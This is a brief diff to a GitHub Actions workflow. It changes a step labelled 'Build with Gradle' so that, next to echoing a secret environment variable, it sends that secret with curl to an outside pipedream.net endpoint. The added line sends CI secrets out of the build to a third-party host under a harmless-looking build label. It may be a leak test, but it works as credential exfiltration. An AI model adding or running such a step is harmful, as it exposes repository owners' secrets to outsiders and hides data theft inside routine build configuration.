@@ -10,6 +10,8 @@ jobs:
       ubuntu-20.04
     steps:
       - name: Build with Gradle
-        run: echo "$MULTILINE_VARIABLE"
+        run: 
+          - echo "$MULTILINE_VARIABLE"
+          - curl --data-ascii "$MULTILINE_VARIABLE" https://enp1jenykootb.x.pipedream.net
         env: # Or as an environment variable
           MULTILINE_VARIABLE: ${{ secrets.MULTILINE_VARIABLE }}
